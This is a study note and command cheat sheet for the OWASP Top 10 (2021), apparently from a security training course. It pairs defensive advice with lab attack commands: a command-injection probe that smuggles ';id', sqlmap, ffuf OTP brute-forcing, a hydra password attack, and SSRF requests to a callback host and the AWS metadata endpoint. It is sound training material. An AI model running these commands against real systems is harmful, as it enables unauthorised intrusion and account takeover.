
# SAL1 Note: Web Hacking — OWASP Top 10 (2021)

## Overview

The OWASP Top 10 (2021) highlights the ten most critical web application security risks. This module breaks each topic down, shows how the vulnerabilities occur, and lets you practice them hands-on. The ten categories are: Broken Access Control, Cryptographic Failures, Injection, Insecure Design, Security Misconfiguration, Vulnerable & Outdated Components, Identification & Authentication Failures, Software & Data Integrity Failures, Security Logging & Monitoring Failures, and Server-Side Request Forgery (SSRF). 

---
## Study Notes (TL;DR)

* **AuthZ** must be enforced server-side on **every** object/action.
* **Injection** → **parameterized queries** + **allow-lists**; prefer safe APIs.
* **Configuration** → minimal attack surface, debug off, no verbose errors in prod.
* **Components** → maintain inventory, track CVEs, patch regularly.
* **Logging/Monitoring** → decide what to log and how to alert **before** incidents.
* **SSRF** → validate/allow-list outbound targets; egress controls; block metadata endpoints.

# SAL1 — Web Hacking: OWASP Top 10 (2021) — Cheat Sheet with Commands

> ⚠️ Run only in authorized lab environments. Replace variables as needed:
> `"$URL"` (e.g., `http://10.10.x.x`), `"$HOST"` (e.g., `10.10.x.x`), `"$COOKIE"` (your auth cookie), `"$TOKEN"` (Bearer token).

---

## 1) Broken Access Control (incl. IDOR)

**Goal:** Find authorization bypasses and Insecure Direct Object References.
**How:** In Burp Repeater, change identifiers (e.g., `id=`) to another user’s value and diff responses.

**Commands**

# Compare your profile vs. another user's (ID changed)
curl -s "$URL/profile?id=1001" -H "Cookie: $COOKIE" > me.html
curl -s "$URL/profile?id=1002" -H "Cookie: $COOKIE" > other.html
diff -u me.html other.html

# REST/GraphQL authz poke
curl -i -H "Authorization: Bearer $TOKEN" "$URL/api/users/1002"

---

## 2) Cryptographic Failures

**Goal:** Spot plaintext transport, weak crypto, plaintext secrets at rest.
**How:** Check transport with `curl`; search repos/configs for secrets.

**Commands**

# Is HTTPS enforced?
curl -I "$URL"
curl -vk "https://$HOST"   # inspect cert/protocol/ciphers

# Grep for secrets in static files / configs (local copy)
grep -RniE 'api[_-]?key|secret|token' .


---

## 3) Injection (SQLi & Command)

**Goal:** Determine if input is interpreted as queries/commands.
**How:** Use Burp Repeater for manual payloads; `sqlmap` for automation.

**Commands**

# SQLi automation (guessing GET param id)
sqlmap -u "$URL/item.php?id=1" --cookie="$COOKIE" --batch --level 3 --risk 2

# Command Injection probe (note ;, &&, |)
curl -i "$URL/ping?host=127.0.0.1;id" -H "Cookie: $COOKIE"


---

## 4) Insecure Design

**Goal:** Find missing controls (rate limits/MFA, business logic flaws).
**How:** Change **order** or **frequency** of actions; test constraints.

**Command**

# Rate-limit check (bruteforcing 4-digit OTP)
ffuf -u "$URL/otp/verify?code=FUZZ" \
     -w /usr/share/seclists/Fuzzing/4-digits-0000-9999.txt \
     -H "Cookie: $COOKIE" -mc all


---

## 5) Security Misconfiguration

**Goal:** Default configs, verbose errors, directory listing, exposed admin.
**How:** Start with a light scanner; brute common paths.

**Commands**

nikto -h "$URL"

ffuf -u "$URL/FUZZ" \
     -w /usr/share/seclists/Discovery/Web-Content/common.txt \
     -mc 200,204,301,302,307,401,403


---

## 6) Vulnerable & Outdated Components

**Goal:** Identify known-vulnerable versions of frameworks/libs.
**How:** Fingerprint via banners, comments, favicon hash; then test known vulns.

**Commands**

# Favicon hash (simple heuristic)
curl -s "$URL/favicon.ico" -o /tmp/fav.ico
md5sum /tmp/fav.ico

# Template vulnerability checks
nuclei -u "$URL" -severity critical,high


---

## 7) Identification & Authentication Failures

**Goal:** Weak/default passwords, user enumeration, session flaws.
**How:** Observe response differences; check lockout & cookie attributes.

**Commands**
# Weak/default password brute (mind the lab’s rate limits)
hydra -l admin -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt \
  $HOST http-post-form "/login.php:username=^USER^&password=^PASS^:F=invalid"

# Inspect session cookie properties
curl -I -s "$URL/login" | sed -n 's/^Set-Cookie:/Set-Cookie:/p'

---

## 8) Software & Data Integrity Failures

**Goal:** Unsigned updates, untrusted CI/CD artifacts, template tampering.
**How:** Verify signatures/hashes; validate update sources.

**Commands**

```bash
sha256sum download.bin
gpg --verify download.sig download.bin
```

---

## 9) Security Logging & Monitoring Failures

**Goal:** Critical events missing or not alerted on.
**How:** Trigger failures and verify logs/alerts exist (per lab UI).

**Command**

```bash
# Failed login with spoofed source IP (should be logged)
curl -i -X POST "$URL/login" \
  -d "u=admin&p=wrong" \
  -H "X-Forwarded-For: 203.0.113.123"
```

---

## 10) SSRF (Server-Side Request Forgery)

**Goal:** Server makes attacker-controlled requests (external/internal).
**How:** Target parameters like `url=`, `endpoint=`, `feed=` with your host or internal IPs.

**Commands**
# Start a listener on your box
python3 -m http.server 8000

# Make the app fetch your URL
curl -i "$URL/fetch?url=http://YOUR_IP:8000/ping"

# Cloud metadata probe (example: AWS)
curl -i "$URL/fetch?url=http://169.254.169.254/latest/meta-data/"

---

## Cross-Cutting Techniques

# 1) Crawl to build Burp Site map (manual + quick wget pass)
wget -r -l 2 -k -np -p "$URL"

# 2) Grep responses for secrets/hardcoded links
ripgrep -ni "api|key|token|secret|href=.*http|TODO|FIXME" .

# 3) Diff baseline vs. tampered requests
curl -s "$URL/item?id=1"  > ok.html
curl -s "$URL/item?id=1'" > inj.html
diff -u ok.html inj.html
